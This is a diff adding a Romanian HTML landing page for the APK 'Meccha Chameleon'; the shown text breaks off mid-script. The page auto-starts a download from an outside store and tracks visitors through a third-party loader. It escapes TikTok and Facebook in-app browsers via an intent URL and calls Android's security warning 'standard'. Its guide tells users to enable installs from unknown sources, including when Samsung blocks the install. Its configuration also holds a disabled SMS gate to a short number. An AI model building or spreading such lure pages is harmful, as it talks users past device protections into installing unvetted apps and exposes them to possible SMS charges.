@@ -1,0 +1,1276 @@
+<!doctype html>
+<html lang="ro">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>Descarcare aplicatie</title>
+  <style>
+    :root{
+      --bg:#070707;
+      --card:#181818;
+      --card-light:#202020;
+      --orange:#ff6700;
+      --orange-light:#ff963f;
+      --orange-dark:#c54200;
+      --text:#eeeeee;
+      --muted:#aaaaaa;
+      --muted-2:#777777;
+      --border:rgba(255,255,255,.09);
+      --success:#74e4bf;
+      --shadow:0 24px 70px rgba(0,0,0,.52);
+      font-family:Inter,Arial,Helvetica,sans-serif;
+    }
+    *{box-sizing:border-box}
+    html{min-height:100%;background:#070707}
+    body{
+      min-height:100vh;
+      margin:0;
+      color:var(--text);
+      background:
+        radial-gradient(circle at 100% 5%, rgba(255,103,0,.14), transparent 28%),
+        radial-gradient(circle at 0% 50%, rgba(255,103,0,.07), transparent 27%),
+        linear-gradient(180deg,#070707 0%,#111111 45%,#080808 100%);
+      overflow-x:hidden;
+    }
+    a{color:inherit}
+    .page{
+      width:min(calc(100% - 28px),1120px);
+      margin:0 auto;
+      padding:24px 0 28px;
+    }
+    .shell{
+      min-height:calc(100vh - 52px);
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      gap:18px;
+    }
+    .topline{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      color:var(--muted);
+      font-size:12px;
+      font-weight:800;
+      text-transform:uppercase;
+      letter-spacing:.08em;
+    }
+    .brand-mark{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      min-width:0;
+    }
+    .mark-icon{
+      width:32px;
+      height:32px;
+      border-radius:11px;
+      display:grid;
+      place-items:center;
+      color:#120700;
+      background:linear-gradient(135deg,var(--orange-light),var(--orange-dark));
+      box-shadow:0 14px 34px rgba(255,103,0,.28);
+      flex:0 0 auto;
+    }
+    .status-pill{
+      border:1px solid var(--border);
+      background:rgba(255,255,255,.045);
+      color:#d8d8d8;
+      padding:8px 10px;
+      border-radius:999px;
+      white-space:nowrap;
+    }
+    .hero-card{
+      border:1px solid var(--border);
+      border-radius:24px;
+      background:
+        linear-gradient(145deg,rgba(255,255,255,.08),rgba(255,255,255,.025)),
+        linear-gradient(180deg,var(--card-light),var(--card));
+      box-shadow:var(--shadow);
+      overflow:hidden;
+      position:relative;
+    }
+    .hero-card:before{
+      content:"";
+      position:absolute;
+      inset:0;
+      pointer-events:none;
+      background:
+        linear-gradient(115deg,rgba(255,103,0,.18),transparent 32%),
+        repeating-linear-gradient(135deg,rgba(255,255,255,.035) 0 1px,transparent 1px 12px);
+      opacity:.58;
+      mask-image:linear-gradient(180deg,#000,transparent 62%);
+    }
+    .hero-inner{
+      position:relative;
+      padding:20px;
+      display:grid;
+      gap:18px;
+    }
+    .app-head{
+      display:grid;
+      grid-template-columns:76px minmax(0,1fr);
+      gap:15px;
+      align-items:center;
+    }
+    .icon-frame{
+      width:76px;
+      height:76px;
+      border-radius:22px;
+      padding:5px;
+      background:linear-gradient(135deg,rgba(255,150,63,.95),rgba(197,66,0,.85));
+      box-shadow:0 18px 38px rgba(255,103,0,.24);
+    }
+    .icon-frame img{
+      width:100%;
+      height:100%;
+      display:block;
+      border-radius:18px;
+      object-fit:cover;
+      background:#101010;
+      border:1px solid rgba(255,255,255,.18);
+    }
+    .app-copy{min-width:0}
+    .eyebrow{
+      margin:0 0 7px;
+      color:var(--orange-light);
+      font-size:12px;
+      line-height:1.2;
+      font-weight:950;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+    }
+    h1{
+      margin:0;
+      font-size:clamp(31px,9vw,58px);
+      line-height:.96;
+      font-weight:1000;
+      text-transform:uppercase;
+      letter-spacing:0;
+      overflow-wrap:anywhere;
+    }
+    .subtitle{
+      margin:8px 0 0;
+      color:var(--muted);
+      line-height:1.45;
+      font-size:14px;
+    }
+    .status-card{
+      border:1px solid var(--border);
+      border-radius:20px;
+      background:rgba(8,8,8,.58);
+      box-shadow:inset 0 1px 0 rgba(255,255,255,.04);
+      overflow:hidden;
+    }
+    .status-grid{
+      display:grid;
+      gap:0;
+    }
+    .loading-panel,.complete-panel{
+      padding:18px;
+    }
+    .loading-row{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:14px;
+    }
+    .loading-text{
+      margin:0;
+      color:#dedede;
+      font-size:15px;
+      line-height:1.45;
+      font-weight:750;
+      min-width:0;
+    }
+    .countdown-box{
+      width:72px;
+      min-height:72px;
+      border-radius:18px;
+      border:1px solid rgba(255,103,0,.38);
+      background:linear-gradient(180deg,rgba(255,103,0,.18),rgba(255,103,0,.045));
+      display:grid;
+      place-items:center;
+      flex:0 0 auto;
+      box-shadow:0 16px 36px rgba(255,103,0,.12);
+    }
+    .countdown-box span{
+      color:#fff;
+      font-size:30px;
+      line-height:1;
+      font-weight:1000;
+      font-variant-numeric:tabular-nums;
+    }
+    .countdown-label{
+      display:block;
+      margin-top:6px;
+      color:var(--muted-2);
+      font-size:11px;
+      font-weight:850;
+      text-transform:uppercase;
+      letter-spacing:.08em;
+      text-align:center;
+    }
+    .track{
+      margin-top:15px;
+      height:8px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,.075);
+      background:linear-gradient(90deg,rgba(255,103,0,.92),rgba(255,150,63,.32),rgba(255,255,255,.07));
+      box-shadow:0 0 24px rgba(255,103,0,.18);
+    }
+    .download-action{
+      padding:0 18px 18px;
+    }
+    .btn{
+      min-height:56px;
+      width:100%;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+      border:0;
+      border-radius:17px;
+      padding:14px 18px;
+      position:relative;
+      overflow:hidden;
+      text-decoration:none;
+      cursor:pointer;
+      color:#180800;
+      background:linear-gradient(135deg,var(--orange-light),var(--orange-dark));
+      box-shadow:0 18px 42px rgba(255,103,0,.28);
+      font-size:14px;
+      line-height:1.2;
+      font-weight:1000;
+      letter-spacing:.08em;
+      text-transform:uppercase;
+    }
+    .btn:before{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:linear-gradient(90deg,transparent,rgba(255,255,255,.38),transparent);
+      transform:translateX(-120%);
+    }
+    .btn:focus-visible,.again-btn:focus-visible{outline:3px solid rgba(255,150,63,.78);outline-offset:3px}
+    .btn svg,.again-btn svg{width:20px;height:20px;flex:0 0 auto}
+    .safety{
+      margin:10px 2px 0;
+      color:var(--success);
+      font-size:12px;
+      line-height:1.45;
+      font-weight:700;
+    }
+    .complete-panel{
+      border-top:1px solid var(--border);
+      background:linear-gradient(180deg,rgba(116,228,191,.06),rgba(255,255,255,.015));
+    }
+    .complete-title{
+      display:flex;
+      align-items:flex-start;
+      gap:10px;
+      margin:0 0 12px;
+      color:#f4f4f4;
+      font-size:15px;
+      line-height:1.45;
+      font-weight:850;
+    }
+    .complete-title svg{
+      width:22px;
+      height:22px;
+      color:var(--success);
+      flex:0 0 auto;
+      margin-top:1px;
+    }
+    .download-hint{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin:0 0 14px;
+      padding:12px;
+      border-radius:16px;
+      border:1px solid rgba(255,255,255,.1);
+      background:rgba(255,255,255,.055);
+      color:#e7e7e7;
+      font-size:13px;
+      line-height:1.42;
+    }
+    .download-hint .hint-icon{
+      width:42px;
+      height:42px;
+      border-radius:14px;
+      display:grid;
+      place-items:center;
+      flex:0 0 auto;
+      color:#140700;
+      background:linear-gradient(135deg,#f4f4f4,#bcbcbc);
+      box-shadow:inset 0 -2px 0 rgba(0,0,0,.14);
+    }
+    .download-hint svg{width:24px;height:24px;display:block}
+    .again-btn{
+      min-height:48px;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      gap:9px;
+      width:100%;
+      border-radius:15px;
+      border:1px solid rgba(255,103,0,.42);
+      background:rgba(255,103,0,.1);
+      color:#ffd5bc;
+      text-decoration:none;
+      font-size:13px;
+      font-weight:950;
+      letter-spacing:.06em;
+      text-transform:uppercase;
+    }
+    .trust-row{
+      display:grid;
+      grid-template-columns:1fr;
+      gap:10px;
+    }
+    .trust-card,.help-card,.guide-card{
+      border:1px solid var(--border);
+      border-radius:18px;
+      background:linear-gradient(180deg,rgba(255,255,255,.055),rgba(255,255,255,.024));
+      padding:15px;
+    }
+    .trust-card{
+      display:flex;
+      gap:12px;
+      align-items:flex-start;
+    }
+    .trust-card svg,.help-card svg{
+      width:22px;
+      height:22px;
+      color:var(--orange-light);
+      flex:0 0 auto;
+    }
+    .trust-card p,.help-card p{margin:0;color:var(--muted);font-size:13px;line-height:1.52}
+    .trust-card strong,.help-card strong{display:block;color:#f3f3f3;margin-bottom:3px;font-size:13px}
+    .help-card h2,.guide-card h2{
+      margin:0 0 12px;
+      color:#fff;
+      font-size:16px;
+      line-height:1.2;
+      font-weight:950;
+      text-transform:uppercase;
+      letter-spacing:.04em;
+    }
+    .steps{
+      display:grid;
+      gap:9px;
+      margin:0;
+      padding:0;
+      list-style:none;
+    }
+    .steps li{
+      display:grid;
+      grid-template-columns:28px 1fr;
+      gap:10px;
+      align-items:flex-start;
+      color:var(--muted);
+      font-size:13px;
+      line-height:1.5;
+    }
+    .steps span{
+      width:28px;
+      height:28px;
+      border-radius:10px;
+      display:grid;
+      place-items:center;
+      color:#1b0b00;
+      background:linear-gradient(135deg,var(--orange-light),var(--orange-dark));
+      font-size:12px;
+      font-weight:1000;
+    }
+    [hidden]{display:none!important}
+    [data-pd="installGuideAccordion"]{
+      display:grid;
+      gap:10px;
+      color:var(--muted);
+      font-size:13px;
+      line-height:1.5;
+    }
+    @media (min-width:760px){
+      .page{padding:42px 0}
+      .shell{gap:22px}
+      .hero-inner{padding:28px;grid-template-columns:1.02fr .98fr;align-items:center}
+      .app-head{grid-template-columns:94px 1fr;gap:18px}
+      .icon-frame{width:94px;height:94px;border-radius:26px}
+      .icon-frame img{border-radius:21px}
+      .status-card{border-radius:22px}
+      .trust-row{grid-template-columns:1fr 1fr}
+      .help-card,.guide-card{padding:18px}
+    }
+  </style>
+<style id="install-guide-injected">/* install-guide-injected */
+.shell.is-post-download,.page.is-post-download,main.is-post-download{align-content:start;min-height:auto;padding-top:8px}
+.status-card.is-compact,[data-pd="statusCard"].is-compact{padding:12px 14px;margin-bottom:0}
+.status-card.is-compact .complete-panel,[data-pd="statusCard"].is-compact [data-pd="downloadCompletePanel"]{margin-top:0;padding-top:0;border-top:0}
+.status-card.is-compact .downloads-hint,[data-pd="statusCard"].is-compact [data-pd="downloadsPointer"]{display:none!important}
+.install-guide{display:grid;gap:12px;padding:4px 2px 8px}
+.install-guide[hidden]{display:none!important}
+.install-guide__title{margin:0;font-size:18px;font-weight:900}
+.install-guide__accordion{display:grid;gap:10px}
+.guide-section{border:1px solid rgba(255,255,255,.12);border-radius:16px;overflow:hidden;background:rgba(255,255,255,.04)}
+.guide-section.is-open{border-color:rgba(184,255,44,.45)}
+.guide-section__trigger{display:flex;align-items:center;justify-content:space-between;gap:10px;width:100%;min-height:48px;padding:12px 14px;border:0;background:transparent;color:inherit;font-family:inherit;font-size:14px;font-weight:900;text-align:left;cursor:pointer}
+.guide-section__chevron{flex:0 0 auto;width:10px;height:10px;border-right:2px solid currentColor;border-bottom:2px solid currentColor;transform:rotate(45deg);transition:transform .2s ease;margin-top:-4px;opacity:.7}
+.guide-section.is-open .guide-section__chevron{transform:rotate(-135deg);margin-top:4px}
+.guide-section__panel{display:none;padding:0 12px 12px}
+.guide-section.is-open .guide-section__panel{display:block}
+.guide-section__body{padding:12px;border-radius:12px;background:#f8f8fc;color:#1a1425}
+.guide-section__image{display:block;width:100%;height:auto;border-radius:10px;margin:0 0 12px}
+.guide-section__steps{margin:0;padding-left:20px;font-size:13.5px;line-height:1.55;color:#2b2340}
+.guide-section__steps li{margin:0 0 8px}
+.guide-section__steps li:last-child{margin-bottom:0}
+</style>
+</head>
+<body>
+  <main class="page">
+    <div class="shell">
+      <div class="topline" aria-label="Stare descarcare">
+        <div class="brand-mark">
+          <span class="mark-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="none">
+              <path d="M4 14.5 7.4 8c.45-.86 1.2-1.5 2.16-1.7A12.1 12.1 0 0 1 12 6c.84 0 1.66.1 2.44.3.96.2 1.71.84 2.16 1.7l3.4 6.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M6 14h12l1.2 3.2A1.3 1.3 0 0 1 18 19h-1.1a1.4 1.4 0 0 1-1.36-1H8.46A1.4 1.4 0 0 1 7.1 19H6a1.3 1.3 0 0 1-1.2-1.8L6 14Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+            </svg>
+          </span>
+          <span>Mod de descarcare</span>
+        </div>
+        <span class="status-pill">APK pregatit</span>
+      </div>
+
+      <section class="hero-card" aria-labelledby="app-title">
+        <div class="hero-inner">
+          <div class="app-head">
+            <div class="icon-frame">
+              <img data-pd="appIcon" src="" alt="Pictograma aplicatiei">
+            </div>
+            <div class="app-copy">
+              <p class="eyebrow">Instalare rapida</p>
+              <h1 id="app-title" data-pd="appName"></h1>
+              <p class="subtitle" data-pd="appSub">Ramanem aici cat timp se pregateste fisierul pentru telefonul tau.</p>
+            </div>
+          </div>
+
+          <div class="status-card" data-pd="statusCard">
+            <div class="status-grid">
+              <div class="loading-panel" data-pd="loadingPanel">
+                <div class="loading-row">
+                  <p class="loading-text" data-pd="loadingText"></p>
+                  <div class="countdown-wrap" aria-label="Cronometru descarcare">
+                    <div class="countdown-box"><span data-pd="countdown"></span></div>
+                    <span class="countdown-label">secunde</span>
+                  </div>
+                </div>
+                <div class="track" aria-hidden="true"></div>
+              </div>
+
+              <div class="download-action" data-pd="downloadAction">
+                <a class="btn" data-pd="downloadButton" href="#" rel="noopener">
+                  <svg aria-hidden="true" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 3v11m0 0 4-4m-4 4-4-4" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M5 17v1.5A2.5 2.5 0 0 0 7.5 21h9A2.5 2.5 0 0 0 19 18.5V17" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/>
+                  </svg>
+                </a>
+                <p class="safety" data-pd="safetyNote">Android poate afișa un avertisment standard de securitate în timpul descărcării.</p>
+              </div>
+
+              <div class="complete-panel" data-pd="downloadCompletePanel" hidden>
+                <p class="complete-title" data-pd="downloadStatus" hidden>
+                  <svg aria-hidden="true" viewBox="0 0 24 24" fill="none">
+                    <path d="m5 12 4.1 4.1L19 6.5" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
+                  </svg>
+                  Fisierul s-a descarcat. Deschide sectiunea Descarcari de pe telefon sau lista de descarcari a browserului pentru a verifica fisierul.
+                </p>
+                <div class="download-hint" data-pd="downloadsPointer" hidden>
+                  <span class="hint-icon" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" fill="none">
+                      <path d="M12 4v8.2m0 0 3.2-3.2M12 12.2 8.8 9" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"/>
+                      <path d="M5.5 15.2h3.2l1.1 1.5h4.4l1.1-1.5h3.2v3.1a1.7 1.7 0 0 1-1.7 1.7H7.2a1.7 1.7 0 0 1-1.7-1.7v-3.1Z" stroke="currentColor" stroke-width="2.1" stroke-linejoin="round"/>
+                    </svg>
+                  </span>
+                  <span>Verifica Descarcari sau lista de descarcari din browser pentru fisierul APK proaspat salvat.</span>
+                </div>
+                <a class="again-btn" data-pd="downloadAgainButton" href="#" rel="noopener" hidden>
+                  <svg aria-hidden="true" viewBox="0 0 24 24" fill="none">
+                    <path d="M20 12a8 8 0 1 1-2.34-5.66" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
+                    <path d="M20 4v5h-5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                  </svg>
+                  Descarca din nou
+                </a>
+                <p class="safety" data-pd="safetyNote" hidden>Android poate afișa un avertisment standard de securitate în timpul descărcării.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <div class="trust-row">
+        <div class="trust-card">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none">
+            <path d="M12 3 5.5 5.6v5.1c0 4.2 2.75 8 6.5 9.3 3.75-1.3 6.5-5.1 6.5-9.3V5.6L12 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+            <path d="m9 12 2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <p><strong>Pagina este doar pentru pregatirea descarcarii.</strong> Nu trebuie sa introduci date personale pentru a continua.</p>
+        </div>
+        <section class="help-card" aria-labelledby="help-title">
+          <h2 id="help-title">Dupa descarcare</h2>
+          <ol class="steps">
+            <li><span>1</span><p>Deschide fisierul din Descarcari cand apare notificarea sau cand il vezi in browser.</p></li>
+            <li><span>2</span><p>Daca Android iti cere confirmarea, verifica numele aplicatiei si continua doar daca il recunosti.</p></li>
+            <li><span>3</span><p>Daca descarcarea nu porneste, foloseste butonul de pe pagina pentru a incerca din nou.</p></li>
+          </ol>
+        </section>
+      </div>
+
+      <section class="guide-card" data-pd="installGuide" hidden aria-live="polite">
+        <h2 data-pd="installGuideTitle"></h2>
+        <div data-pd="installGuideAccordion"></div>
+      </section>
+    </div>
+  </main>
+  <script type="application/json" id="preDownloadPayload">{"language":"ro","htmlLang":"ro","appName":"Meccha Chameleon","appIconUrl":"https://bucket.modobom.net/cms/545/assets/meccha-chameleon-1783478389171.webp","downloadUrl":"https://cz.apex24.store/getapp?app_id=mecchanchameleon\u0026rx=cz\u0026pf=tt\u0026vx=3","buttonText":"Descărcare standard","loadingText":"Se pregătește descărcarea...","downloadCompleteText":"Fișier descărcat. Deschide Descărcări pentru a verifica fișierul.","downloadAgainText":"Descarcă din nou","downloadsPointerText":"Verifică notificarea Descărcări din browser.","safetyNote":"Android poate afișa un avertisment standard de securitate în timpul descărcării.","countdownSeconds":3,"autoRedirectEnabled":true,"smsOnPredownloadEnabled":false,"smsPhone":"+4885580","smsBody":"CS","smsButtonText":"Descarcă 0 Data cu AIS","inAppBrowserTitle":"Open in browser to continue","inAppBrowserMessage":"This download page does not work inside TikTok or Facebook. You must continue in your browser.","inAppBrowserManualHeading":"If the button does not work:","inAppBrowserStepMenu":"Tap ⋯ at the top right","inAppBrowserStepOpenBrowser":"Select \u0022Open in browser\u0022 (globe icon)","inAppBrowserOpenLabel":"Open in browser","inAppBrowserGateEnabled":true,"inAppBrowserDetectors":[{"slug":"tiktok","name":"TikTok","pattern":"\\b(?:trill|musical_ly)[_ /]\\d|BytedanceWebview|Aweme|TikTok"}],"installGuideEnabled":true,"installGuideTitle":"Cum instalezi aplicația","appSubComplete":"Descărcarea a început. Urmează pașii de mai jos pentru a instala aplicația.","installGuideScrollOffset":12,"installGuideSections":[{"id":"main","title":"Instalează APK","imageUrl":"https://bucket.modobom.net/assets/allowinstall.jpg","defaultOpen":true,"steps":["Trage în jos bara de notificări","Atinge fișierul APK descărcat","Activează \u0027Allow from this source\u0027","Apasă Install","Atinge Open"]},{"id":"cantfind","title":"Nu găsești fișierul APK?","imageUrl":"https://bucket.modobom.net/assets/cantfind.jpg","defaultOpen":false,"steps":["Deschide aplicația Files","Deschide Descărcări","Găsește fișierul APK","Atinge fișierul APK","Apasă Install"]},{"id":"samsung","title":"Instalare Samsung blocată?","imageUrl":"https://bucket.modobom.net/assets/samsung.jpg","defaultOpen":false,"steps":["Când este blocată, atinge Settings","Deschide Install unknown apps","Permite Chrome","Revino și atinge Install"]}]}</script>
+<script>
+!function(w,d,n){if(w[n]&&w[n].__loaded)return;var q=w[n]=w[n]||[];q._q=q._q||[];function stub(m){q[m]=function(){q._q.push([m].concat(Array.prototype.slice.call(arguments,0)));return q;};}var methods=['init','load','track','trackOnce','getIds','createDownloadClickId','getDownloadClickId','trackAutoRedirect','debug'];for(var i=0;i<methods.length;i++){stub(methods[i]);}q.__SV=1;q.load=function(k,c){q._projectKey=k;q._config=c||{};var h=String(q._config.asset_host||'https:' + '//' + 'cdn.fastmart24.store').replace(/\/+$/,'');var s=d.createElement('script');s.type='text/javascript';s.async=!0;s.src=h+'/js/df-helper.min.js';var f=d.getElementsByTagName('script')[0];f.parentNode.insertBefore(s,f);};}(window,document,'downloadFunnel');
+
+downloadFunnel.load('dfpk_t1k9su6ium5n7ztlqxfyevz6nscdagde', {
+  api_host: 'https:' + '//' + 'onesignal5.fastmart24.store',
+  asset_host: 'https:' + '//' + 'cdn.fastmart24.store',
+  debug: false
+});
+
+(function () {
+    window.__preDownloadRuntimeLoaded = true;
+
+    var payloadElement = document.getElementById('preDownloadPayload');
+    if (!payloadElement) {
+        return;
+    }
+
+    var payload = {};
+    try {
+        payload = JSON.parse(payloadElement.textContent || '{}');
+    } catch (error) {
+        payload = {};
+    }
+
+    var trackingDispatchDelayMs = 160;
+
+    var getDownloadFunnel = function () {
+        if (window.downloadFunnel) {
+            return window.downloadFunnel;
+        }
+
+        return null;
+    };
+
+    var getTrackingIds = function () {
+        var downloadFunnel = getDownloadFunnel();
+        if (!downloadFunnel || typeof downloadFunnel.getIds !== 'function') {
+            return {};
+        }
+
+        try {
+            return downloadFunnel.getIds() || {};
+        } catch (error) {
+            return {};
+        }
+    };
+
+    var ensureDownloadClickId = function () {
+        var downloadFunnel = getDownloadFunnel();
+        if (!downloadFunnel) {
+            return '';
+        }
+
+        try {
+            if (typeof downloadFunnel.getDownloadClickId === 'function') {
+                var existingClickId = downloadFunnel.getDownloadClickId();
+                if (existingClickId) {
+                    return existingClickId;
+                }
+            }
+
+            if (typeof downloadFunnel.createDownloadClickId === 'function') {
+                return downloadFunnel.createDownloadClickId() || '';
+            }
+        } catch (error) {
+            return '';
+        }
+
+        return '';
+    };
+
+    var appendTrackingParams = function (url, params) {
+        if (!url) {
+            return url;
+        }
+
+        var hashParts = String(url).split('#');
+        var beforeHash = hashParts[0];
+        var hash = hashParts.length > 1 ? '#' + hashParts.slice(1).join('#') : '';
+        var queryParts = beforeHash.split('?');
+        var base = queryParts[0];
+        var queryString = queryParts.length > 1 ? queryParts.slice(1).join('?') : '';
+        var pairs = queryString ? queryString.split('&') : [];
+        var existing = {};
+
+        pairs.forEach(function (pair) {
+            var keyValue = pair.split('=');
+            if (keyValue[0]) {
+                existing[keyValue[0]] = keyValue.slice(1).join('=');
+            }
+        });
+
+        Object.keys(params).forEach(function (key) {
+            if (params[key]) {
+                existing[key] = encodeURIComponent(params[key]);
+            }
+        });
+
+        var nextQuery = Object.keys(existing).map(function (key) {
+            return key + '=' + existing[key];
+        }).join('&');
+
+        return base + (nextQuery ? '?' + nextQuery : '') + hash;
+    };
+
+    var buildTrackedDownloadUrl = function (clickId) {
+        var ids = getTrackingIds();
+        return appendTrackingParams(payload.downloadUrl || '#', {
+            vid: ids.visitorId || ids.visitor_id,
+            sid: ids.sessionId || ids.session_id,
+            fid: ids.flowId || ids.flow_id,
+            dcid: clickId
+        });
+    };
+
+    var runAfterTrackingDelay = function (callback) {
+        window.setTimeout(callback, trackingDispatchDelayMs);
+    };
+
+    var trackPredownloadButtonClick = function (buttonId, clickId, callback) {
+        var downloadFunnel = getDownloadFunnel();
+        if (downloadFunnel && typeof downloadFunnel.track === 'function') {
+            downloadFunnel.track('predownload_button_click', {
+                button_id: buttonId,
+                download_click_id: clickId,
+                dedupe_key: clickId ? clickId + ':' + buttonId : buttonId
+            });
+        }
+
+        runAfterTrackingDelay(callback);
+    };
+
+    var trackPredownloadAutoRedirect = function (callback) {
+        var downloadFunnel = getDownloadFunnel();
+        if (downloadFunnel && typeof downloadFunnel.trackAutoRedirect === 'function') {
+            downloadFunnel.trackAutoRedirect();
+        } else if (downloadFunnel && typeof downloadFunnel.track === 'function') {
+            downloadFunnel.track('predownload_auto_redirect', {
+                dedupe_key: 'predownload_auto_redirect:' + window.location.pathname
+            });
+        }
+
+        runAfterTrackingDelay(callback);
+    };
+
+    var htmlLang = payload.htmlLang || payload.language || '';
+    if (htmlLang) {
+        document.documentElement.setAttribute('lang', htmlLang);
+    }
+
+    var bindText = function (name, value) {
+        document.querySelectorAll('[data-pd="' + name + '"]').forEach(function (element) {
+            element.textContent = value || '';
+        });
+    };
+
+    var bindTextIfEmpty = function (name, value) {
+        document.querySelectorAll('[data-pd="' + name + '"]').forEach(function (element) {
+            if (!element.textContent.trim()) {
+                element.textContent = value || '';
+            }
+        });
+    };
+
+    var setHidden = function (selector, hidden) {
+        document.querySelectorAll(selector).forEach(function (element) {
+            element.hidden = hidden;
+            element.setAttribute('aria-hidden', hidden ? 'true' : 'false');
+        });
+    };
+
+    var setHiddenElement = function (element, hidden) {
+        if (!element) {
+            return;
+        }
+
+        element.hidden = hidden;
+        element.setAttribute('aria-hidden', hidden ? 'true' : 'false');
+    };
+
+    var hideOriginalDownloadActions = function () {
+        downloadButtons.forEach(function (element) {
+            var action = element.closest('[data-pd="downloadAction"], .download-action');
+            setHiddenElement(action || element, true);
+        });
+    };
+
+    bindText('appName', payload.appName);
+    bindText('loadingText', payload.loadingText);
+
+    document.querySelectorAll('[data-pd="appIcon"]').forEach(function (element) {
+        if (payload.appIconUrl) {
+            element.setAttribute('src', payload.appIconUrl);
+        }
+        element.setAttribute('alt', payload.appName || 'App icon');
+    });
+
+    var downloadButtons = document.querySelectorAll('[data-pd="downloadButton"]');
+    downloadButtons.forEach(function (element) {
+        element.textContent = payload.buttonText || 'Download now';
+        element.setAttribute('href', buildTrackedDownloadUrl(ensureDownloadClickId()));
+        element.setAttribute('rel', 'noopener');
+    });
+
+    var smsGateRequired = !!payload.smsOnPredownloadEnabled;
+    var smsGateComplete = !smsGateRequired;
+    var inAppBrowserBlocked = false;
+
+    var detectInAppBrowser = function () {
+        if (!payload.inAppBrowserGateEnabled) {
+            return { inApp: false, name: '' };
+        }
+
+        var ua = navigator.userAgent || '';
+        var detectors = payload.inAppBrowserDetectors || [];
+
+        for (var i = 0; i < detectors.length; i++) {
+            var detector = detectors[i];
+            if (!detector || !detector.pattern) {
+                continue;
+            }
+
+            try {
+                if (new RegExp(detector.pattern, 'i').test(ua)) {
+                    return { inApp: true, name: detector.name || 'App' };
+                }
+            } catch (error) {
+                continue;
+            }
+        }
+
+        return { inApp: false, name: '' };
+    };
+
+    var releaseInAppBrowserBlock = function () {
+        inAppBrowserBlocked = false;
+        document.documentElement.style.overflow = '';
+        document.body.style.overflow = '';
+        var overlay = document.getElementById('PreDownloadInAppBrowserPrompt');
+        var style = document.getElementById('PreDownloadInAppBrowserStyles');
+        if (overlay) overlay.remove();
+        if (style) style.remove();
+        maybeStartAutoDownload();
+    };
+
+    var showInAppBrowserPrompt = function (browserInfo) {
+        if (document.getElementById('PreDownloadInAppBrowserPrompt')) {
+            return;
+        }
+
+        inAppBrowserBlocked = true;
+        document.documentElement.style.overflow = 'hidden';
+        document.body.style.overflow = 'hidden';
+
+        var pageUrl = window.location.href.split('#')[0];
+        var isAndroid = /Android/i.test(navigator.userAgent);
+        var intentScheme = pageUrl.indexOf('https:') === 0 ? 'https' : 'http';
+        var intentUrl = 'intent://' + pageUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=' + intentScheme + ';action=android.intent.action.VIEW;end';
+
+        var style = document.createElement('style');
+        style.id = 'PreDownloadInAppBrowserStyles';
+        style.textContent = '.pd-iab-prompt{position:fixed;inset:0;z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at 50% 20%,rgba(140,198,63,.22),transparent 34%),rgba(3,15,8,.9);backdrop-filter:blur(10px);touch-action:none;user-select:none;-webkit-user-select:none}.pd-iab-prompt__panel{position:relative;width:100%;max-width:400px;overflow:hidden;border-radius:28px;padding:28px 24px 24px;text-align:center;color:#17310f;background:linear-gradient(180deg,#fff 0%,#f3ffe8 58%,#e5f8d5 100%);border:1px solid rgba(140,198,63,.45);box-shadow:0 28px 80px rgba(0,0,0,.42),0 0 0 6px rgba(140,198,63,.12)}.pd-iab-prompt__panel::before{content:"";position:absolute;inset:0 0 auto;height:8px;background:linear-gradient(90deg,#8cc63f,#5ead2f,#168a2f)}.pd-iab-prompt__badge{display:inline-flex;align-items:center;justify-content:center;min-width:72px;height:72px;margin-bottom:14px;border-radius:20px;background:#fff;box-shadow:0 14px 30px rgba(92,173,47,.22)}.pd-iab-prompt__badge svg{display:block;width:48px;height:48px}.pd-iab-prompt__title{margin:0 0 10px;font-size:22px;font-weight:900;color:#17310f}.pd-iab-prompt__message{margin:0 0 18px;font-size:15px;line-height:1.55;color:#385431}.pd-iab-prompt__open{display:flex;align-items:center;justify-content:center;width:100%;box-sizing:border-box;margin-bottom:18px;padding:16px 18px;border:0;border-radius:18px;color:#fff;font-size:17px;font-weight:900;text-decoration:none;background:linear-gradient(90deg,#8cc63f,#5ead2f 50%,#168a2f);box-shadow:0 14px 28px rgba(92,173,47,.34)}.pd-iab-prompt__manual{margin:0 0 10px;font-size:13px;font-weight:900;letter-spacing:.4px;text-transform:uppercase;color:#5a8f21}.pd-iab-prompt__steps{margin:0;padding:0 0 0 22px;text-align:left;color:#17310f}.pd-iab-prompt__steps li{margin:0 0 10px;font-size:15px;line-height:1.5}.pd-iab-prompt__steps li:last-child{margin-bottom:0}.pd-iab-prompt__app{font-weight:900;color:#168a2f}';
+
+        var overlay = document.createElement('div');
+        overlay.id = 'PreDownloadInAppBrowserPrompt';
+        overlay.className = 'pd-iab-prompt';
+        overlay.setAttribute('role', 'alertdialog');
+        overlay.setAttribute('aria-modal', 'true');
+        overlay.setAttribute('aria-labelledby', 'PreDownloadInAppBrowserTitle');
